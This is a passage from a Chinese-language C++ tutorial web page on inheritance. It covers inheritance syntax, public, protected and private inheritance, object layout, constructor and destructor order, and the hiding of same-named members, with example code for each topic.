+ v2;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void test02()</span><br><span class="line">&#123;</span><br><span class="line">MyAdd add;</span><br><span class="line">int ret &#x3D; add(10, 10);</span><br><span class="line">cout &lt;&lt; &quot;ret &#x3D; &quot; &lt;&lt; ret &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;匿名对象调用  </span><br><span class="line">cout &lt;&lt; &quot;MyAdd()(100,100) &#x3D; &quot; &lt;&lt; MyAdd()(100, 100) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line">test02();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p><strong>继承是面向对象三大特性之一</strong></p><p>有些类与类之间存在特殊的关系</p><p>我们发现，定义这些类时，下级别的成员除了拥有上一级的共性，还有自己的特性。</p><p>这个时候我们就可以考虑利用继承的技术，减少重复代码</p><h3 id="继承的基本语法"><a href="#继承的基本语法" class="headerlink" title="继承的基本语法"></a>继承的基本语法</h3><p>例如我们看到很多网站中，都有公共的头部，公共的底部，甚至公共的左侧列表，只有中心内容不同</p><p>接下来我们分别利用普通写法和继承的写法来实现网页中的内容，看一下继承存在的意义以及好处</p><p><strong>普通实现：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;Java页面</span><br><span class="line">class Java </span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">void header()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;首页、公开课、登录、注册...（公共头部）&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">void footer()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;帮助中心、交流合作、站内地图...(公共底部)&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">void left()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Java,Python,C++...(公共分类列表)&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">void content()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;JAVA学科视频&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">&#x2F;&#x2F;Python页面</span><br><span class="line">class Python</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">void header()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;首页、公开课、登录、注册...（公共头部）&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">void footer()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;帮助中心、交流合作、站内地图...(公共底部)&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">void left()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Java,Python,C++...(公共分类列表)&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">void content()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Python学科视频&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">&#x2F;&#x2F;C++页面</span><br><span class="line">class CPP </span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">void header()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;首页、公开课、登录、注册...（公共头部）&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">void footer()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;帮助中心、交流合作、站内地图...(公共底部)&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">void left()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Java,Python,C++...(公共分类列表)&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">void content()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;C++学科视频&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;Java页面</span><br><span class="line">cout &lt;&lt; &quot;Java下载视频页面如下： &quot; &lt;&lt; endl;</span><br><span class="line">Java ja;</span><br><span class="line">ja.header();</span><br><span class="line">ja.footer();</span><br><span class="line">ja.left();</span><br><span class="line">ja.content();</span><br><span class="line">cout &lt;&lt; &quot;--------------------&quot; &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Python页面</span><br><span class="line">cout &lt;&lt; &quot;Python下载视频页面如下： &quot; &lt;&lt; endl;</span><br><span class="line">Python py;</span><br><span class="line">py.header();</span><br><span class="line">py.footer();</span><br><span class="line">py.left();</span><br><span class="line">py.content();</span><br><span class="line">cout &lt;&lt; &quot;--------------------&quot; &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;C++页面</span><br><span class="line">cout &lt;&lt; &quot;C++下载视频页面如下： &quot; &lt;&lt; endl;</span><br><span class="line">CPP cp;</span><br><span class="line">cp.header();</span><br><span class="line">cp.footer();</span><br><span class="line">cp.left();</span><br><span class="line">cp.content();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>继承实现：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;公共页面</span><br><span class="line">class BasePage</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">void header()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;首页、公开课、登录、注册...（公共头部）&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void footer()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;帮助中心、交流合作、站内地图...(公共底部)&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">void left()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Java,Python,C++...(公共分类列表)&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Java页面</span><br><span class="line">class Java : public BasePage</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">void content()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;JAVA学科视频&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">&#x2F;&#x2F;Python页面</span><br><span class="line">class Python : public BasePage</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">void content()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Python学科视频&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">&#x2F;&#x2F;C++页面</span><br><span class="line">class CPP : public BasePage</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">void content()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;C++学科视频&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;Java页面</span><br><span class="line">cout &lt;&lt; &quot;Java下载视频页面如下： &quot; &lt;&lt; endl;</span><br><span class="line">Java ja;</span><br><span class="line">ja.header();</span><br><span class="line">ja.footer();</span><br><span class="line">ja.left();</span><br><span class="line">ja.content();</span><br><span class="line">cout &lt;&lt; &quot;--------------------&quot; &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Python页面</span><br><span class="line">cout &lt;&lt; &quot;Python下载视频页面如下： &quot; &lt;&lt; endl;</span><br><span class="line">Python py;</span><br><span class="line">py.header();</span><br><span class="line">py.footer();</span><br><span class="line">py.left();</span><br><span class="line">py.content();</span><br><span class="line">cout &lt;&lt; &quot;--------------------&quot; &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;C++页面</span><br><span class="line">cout &lt;&lt; &quot;C++下载视频页面如下： &quot; &lt;&lt; endl;</span><br><span class="line">CPP cp;</span><br><span class="line">cp.header();</span><br><span class="line">cp.footer();</span><br><span class="line">cp.left();</span><br><span class="line">cp.content();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><p>继承的好处：==可以减少重复的代码==</p><p>class A : public B;</p><p>A 类称为子类 或 派生类</p><p>B 类称为父类 或 基类</p><p><strong>派生类中的成员，包含两大部分</strong>：</p><p>一类是从基类继承过来的，一类是自己增加的成员。</p><p>从基类继承过过来的表现其共性，而新增的成员体现了其个性。</p><h3 id="继承方式"><a href="#继承方式" class="headerlink" title="继承方式"></a>继承方式</h3><p>继承的语法：<code>class 子类 : 继承方式 父类</code></p><p><strong>继承方式一共有三种：</strong></p><ul><li>公共继承</li><li>保护继承</li><li>私有继承</li></ul><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">class Base1</span><br><span class="line">&#123;</span><br><span class="line">public: </span><br><span class="line">int m_A;</span><br><span class="line">protected:</span><br><span class="line">int m_B;</span><br><span class="line">private:</span><br><span class="line">int m_C;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;公共继承</span><br><span class="line">class Son1 :public Base1</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">void func()</span><br><span class="line">&#123;</span><br><span class="line">m_A; &#x2F;&#x2F;可访问 public权限</span><br><span class="line">m_B; &#x2F;&#x2F;可访问 protected权限</span><br><span class="line">&#x2F;&#x2F;m_C; &#x2F;&#x2F;不可访问</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void myClass()</span><br><span class="line">&#123;</span><br><span class="line">Son1 s1;</span><br><span class="line">s1.m_A; &#x2F;&#x2F;其他类只能访问到公共权限</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;保护继承</span><br><span class="line">class Base2</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">int m_A;</span><br><span class="line">protected:</span><br><span class="line">int m_B;</span><br><span class="line">private:</span><br><span class="line">int m_C;</span><br><span class="line">&#125;;</span><br><span class="line">class Son2:protected Base2</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">void func()</span><br><span class="line">&#123;</span><br><span class="line">m_A; &#x2F;&#x2F;可访问 protected权限</span><br><span class="line">m_B; &#x2F;&#x2F;可访问 protected权限</span><br><span class="line">&#x2F;&#x2F;m_C; &#x2F;&#x2F;不可访问</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">void myClass2()</span><br><span class="line">&#123;</span><br><span class="line">Son2 s;</span><br><span class="line">&#x2F;&#x2F;s.m_A; &#x2F;&#x2F;不可访问</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;私有继承</span><br><span class="line">class Base3</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">int m_A;</span><br><span class="line">protected:</span><br><span class="line">int m_B;</span><br><span class="line">private:</span><br><span class="line">int m_C;</span><br><span class="line">&#125;;</span><br><span class="line">class Son3:private Base3</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">void func()</span><br><span class="line">&#123;</span><br><span class="line">m_A; &#x2F;&#x2F;可访问 private权限</span><br><span class="line">m_B; &#x2F;&#x2F;可访问 private权限</span><br><span class="line">&#x2F;&#x2F;m_C; &#x2F;&#x2F;不可访问</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">class GrandSon3 :public Son3</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">void func()</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;Son3是私有继承，所以继承Son3的属性在GrandSon3中都无法访问到</span><br><span class="line">&#x2F;&#x2F;m_A;</span><br><span class="line">&#x2F;&#x2F;m_B;</span><br><span class="line">&#x2F;&#x2F;m_C;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="继承中的对象模型"><a href="#继承中的对象模型" class="headerlink" title="继承中的对象模型"></a>继承中的对象模型</h3><p><strong>问题：</strong>从父类继承过来的成员，哪些属于子类对象中？</p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">class Base</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">int m_A;</span><br><span class="line">protected:</span><br><span class="line">int m_B;</span><br><span class="line">private:</span><br><span class="line">int m_C; &#x2F;&#x2F;私有成员只是被隐藏了，但是还是会继承下去</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;公共继承</span><br><span class="line">class Son :public Base</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">int m_D;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;sizeof Son &#x3D; &quot; &lt;&lt; sizeof(Son) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用工具查看：</p><p>Visual Studio下有名称为“开发人员的命令提示符”</p><p>打开工具窗口后，定位到当前CPP文件的盘符</p><p>然后输入： cl /d1 reportSingleClassLayoutSon查看的类名 所属文件名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*************************************************************</span><br><span class="line">C:\Program Files (x86)\Microsoft Visual Studio\Community&gt;F:</span><br><span class="line">F:\&gt;<span class="built_in">cd</span> F:\VS项目\继承\</span><br><span class="line">F:\&gt;<span class="built_in">cd</span> F:\VS项目\继承\cl /d1 reportSingleClassLayoutSon <span class="string">&quot;继承中的对象模型.cpp&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>结论： 父类中私有成员也是被子类继承下去了，只是由编译器给隐藏后访问不到</p></blockquote><h3 id="继承中构造和析构顺序"><a href="#继承中构造和析构顺序" class="headerlink" title="继承中构造和析构顺序"></a>继承中构造和析构顺序</h3><p>子类继承父类后，当创建子类对象，也会调用父类的构造函数</p><p>问题：父类和子类的构造和析构顺序是谁先谁后？</p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">class Base </span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">Base()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Base构造函数!&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">~Base()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Base析构函数!&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">class Son : public Base</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">Son()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Son构造函数!&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">~Son()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Son析构函数!&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;继承中 先调用父类构造函数，再调用子类构造函数，析构顺序与构造相反</span><br><span class="line">Son s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>总结：继承中 先调用父类构造函数，再调用子类构造函数，析构顺序与构造相反</p></blockquote><h3 id="继承同名成员处理方式"><a href="#继承同名成员处理方式" class="headerlink" title="继承同名成员处理方式"></a>继承同名成员处理方式</h3><p>问题：当子类与父类出现同名的成员，如何通过子类对象，访问到子类或父类中同名的数据呢？</p><ul><li>访问子类同名成员 直接访问即可</li><li>访问父类同名成员 需要加作用域</li></ul><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">class Base &#123;</span><br><span class="line">public:</span><br><span class="line">Base()</span><br><span class="line">&#123;</span><br><span class="line">m_A &#x3D; 100;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void func()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Base - func()调用&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void func(int a)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Base - func(int a)调用&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">int m_A;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Son : public Base &#123;</span><br><span class="line">public:</span><br><span class="line">Son()</span><br><span class="line">&#123;</span><br><span class="line">m_A &#x3D; 200;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;当子类与父类拥有同名的成员函数，子类会隐藏父类中所有版本的同名成员函数</span><br><span class="line">&#x2F;&#x2F;如果想访问父类中被隐藏的同名成员函数，需要加父类的作用域</span><br><span class="line">void func()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;Son - func()调用&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">public:</span><br><span class="line">int m_A;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">Son s;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; &quot;Son下的m_A &#x3D; &quot; &lt;&lt; s.m_A &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; &quot;Base下的m_A &#x3D; &quot; &lt;&lt; s.Base::m_A &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">s.func();</span><br><span class="line">s.Base::func();</span><br><span class="line">s.Base::func(10);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line">return EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：</p><ol><li>子类对象可以直接访问到子类中同名成员</li><li>子类对象加作用域可以访问到父类同名成员</li><li>当子类与父类拥有同名的成员函数，子类会隐藏父类中同名成员函数，加作用域可以访问到父类中同名函数</li></ol><h3 id="继承同名静态成员处理方式"><a href="#继承同名静态成员处理方式" class="headerlink" title="继承同名静态成员处理方式"></a>继承同名静态成员处理方式</h3><p>问题：继承中同名的静态成员在子类对象上如何进行访问？</p><p>静态成员和非静态成员出现同名，处理方式一致</p><ul><li>访问子类同名成员 直接访问即可</li><li>访问父类同名成员 需要加作用域</li></ul><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 